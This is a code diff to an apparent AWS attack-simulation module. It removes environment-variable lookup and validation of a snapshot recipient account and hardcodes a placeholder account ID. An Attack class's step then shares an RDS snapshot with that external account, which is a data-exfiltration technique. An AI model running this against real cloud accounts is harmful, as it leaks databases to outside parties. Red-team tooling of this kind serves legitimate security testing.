@@ -2,22 +2,12 @@ import os
 import json
 import time
 import botocore
-import re
 import copy
 from lib.iam_operations import create_client_profile, create_client_with_sts_credentials
 from lib.instance_repo import add_to_disk
 from lib.iam_enum import role_recon_sts_token
 
-
-def get_snapshot_recipient_account_id():
-    account_id = os.getenv('ZTI_SNAPSHOT_RECIPIENT_ACCOUNT_ID')
-    if not account_id:
-        raise RuntimeError(
-            'ZTI_SNAPSHOT_RECIPIENT_ACCOUNT_ID must be set before sharing an RDS snapshot.'
-        )
-    if not re.fullmatch(r'\d{12}', account_id):
-        raise ValueError('ZTI_SNAPSHOT_RECIPIENT_ACCOUNT_ID must be a 12-digit AWS account ID.')
-    return account_id
+ZTI_SNAPSHOT_RECIPIENT_ACCOUNT_ID = '000000000000'
 
 
 def redact_snapshot_recipient(response):
@@ -52,10 +42,9 @@ class Attack:
             self._add_to_disk()
 
             self.step = 3
-            recipient_account_id = get_snapshot_recipient_account_id()
             self.share_rds_snapshot(
                 self.instance['resources']['rds_snapshot_id'],
-                recipient_account_id,
+                ZTI_SNAPSHOT_RECIPIENT_ACCOUNT_ID,
                 sts_creds,
             )
             self.status = 'attack_complete'
